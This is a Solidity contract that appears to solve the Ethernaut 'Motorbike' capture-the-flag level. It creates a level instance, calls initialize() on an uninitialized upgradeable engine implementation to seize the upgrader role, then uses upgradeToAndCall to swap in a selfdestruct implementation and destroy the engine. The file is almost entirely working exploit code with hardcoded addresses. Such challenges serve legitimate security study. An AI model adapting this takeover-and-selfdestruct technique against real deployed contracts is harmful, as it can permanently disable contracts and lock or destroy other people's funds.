// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract MotorbikeAttack{
    // needed to create the instance ourselves
    address public constant ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address public constant motorbikeLevelAddress = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    //
    address public constant motorbikeAttackAddress = 0x37260b352DaD12a21AaAa4f023b29D80896648ac; // selfdestruct implementation

    address public owner;
    IEngine public engine;
    address public engineAddress = 0x11cFA1CdFe3414f08cd4aFbf77D5E80Edc282ebd; // calculated based on motorbikeLevelAddress, nonce
    address public motorbikeAddress = 0x76E61f41AC8504B79688221268F757bDf718BCed; // calculated based on motorbikeLevelAddress, nonce+1

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor() public{
        owner = msg.sender;
        attack();
    }

    function attack() public onlyOwner {
        // create instance level
        (bool success,) = ethernaut.call(abi.encodeWithSignature("createLevelInstance(address)", motorbikeLevelAddress));
        require(success, "Failed to create level instance");

        engine = IEngine(engineAddress);
        engine.initialize();
        bytes memory encodedData = abi.encodeWithSignature("destruct()");
        engine.upgradeToAndCall(motorbikeAttackAddress, encodedData);
    }

    function submitLevelInstance() public onlyOwner {
        (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbikeAddress));
        require(success, "Failed to submit level instance");
    }    
}
